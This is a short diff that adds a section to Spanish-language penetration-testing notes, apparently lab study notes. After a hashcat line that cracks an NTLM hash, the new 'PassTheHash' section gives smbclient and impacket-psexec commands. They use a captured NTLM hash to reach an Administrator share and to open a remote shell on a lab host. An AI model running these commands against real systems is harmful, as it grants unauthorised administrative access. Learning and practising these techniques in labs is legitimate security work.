@@ -90,3 +90,13 @@ En este caso, el modo es 1000, por lo tanto:
     └─# hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt
 
 Y obtenemos la contraseña en texto plano.
+
+### PassTheHash
+
+  Conectar a compartido por smbclient con PtH:
+
+    smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+  Obtener shell con psexec a través de PtH:
+
+    impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
